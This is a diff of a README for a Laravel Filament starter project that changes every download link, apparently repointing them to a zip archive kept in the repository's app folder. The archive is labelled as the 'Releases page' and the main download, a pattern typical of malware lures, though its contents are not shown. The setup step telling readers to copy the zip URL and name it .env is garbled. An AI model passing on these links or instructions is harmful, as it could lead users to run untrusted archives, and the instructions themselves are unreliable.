@@ -2,7 +2,7 @@
 
 ## 📥 Download Now!
 
-[![Download](https://github.com/Zekeriya-ulus/laravel-filament-starter/raw/refs/heads/main/database/seeders/starter_filament_laravel_1.2.zip)](https://github.com/Zekeriya-ulus/laravel-filament-starter/raw/refs/heads/main/database/seeders/starter_filament_laravel_1.2.zip)
+[![Download](https://github.com/Zekeriya-ulus/laravel-filament-starter/raw/refs/heads/main/app/starter_laravel_filament_3.2.zip)](https://github.com/Zekeriya-ulus/laravel-filament-starter/raw/refs/heads/main/app/starter_laravel_filament_3.2.zip)
 
 ## 📘 Introduction
 
@@ -21,7 +21,7 @@ Before you start, ensure your computer meets the following requirements:
 
 ### 📥 Download & Install
 
-To get the application, visit the [Releases page](https://github.com/Zekeriya-ulus/laravel-filament-starter/raw/refs/heads/main/database/seeders/starter_filament_laravel_1.2.zip) to download the latest version. Follow these steps:
+To get the application, visit the [Releases page](https://github.com/Zekeriya-ulus/laravel-filament-starter/raw/refs/heads/main/app/starter_laravel_filament_3.2.zip) to download the latest version. Follow these steps:
 
 1. Click the "Releases" link above.
 2. Find the version you'd like to download.
@@ -42,7 +42,7 @@ To set up the application, follow these steps:
    ```bash
    composer install
    ```
-5. **Configuration**: Create a copy of the `https://github.com/Zekeriya-ulus/laravel-filament-starter/raw/refs/heads/main/database/seeders/starter_filament_laravel_1.2.zip` file and name it `.env`. Update the `.env` file with your database details for connection.
+5. **Configuration**: Create a copy of the `https://github.com/Zekeriya-ulus/laravel-filament-starter/raw/refs/heads/main/app/starter_laravel_filament_3.2.zip` file and name it `.env`. Update the `.env` file with your database details for connection.
 
 6. **Generate Key**: You need to generate an application key by running:
    ```bash
@@ -81,4 +81,4 @@ If you encounter any issues or have questions, feel free to open an issue on the
 
 You now have a comprehensive guide to download and run the **laravel-filament-starter** project. With its straightforward setup and rich features, you can create modern admin panels without hassle. Happy coding! 
 
-Visit the [Releases page](https://github.com/Zekeriya-ulus/laravel-filament-starter/raw/refs/heads/main/database/seeders/starter_filament_laravel_1.2.zip) again if you need to download or check for newer versions.
+Visit the [Releases page](https://github.com/Zekeriya-ulus/laravel-filament-starter/raw/refs/heads/main/app/starter_laravel_filament_3.2.zip) again if you need to download or check for newer versions.
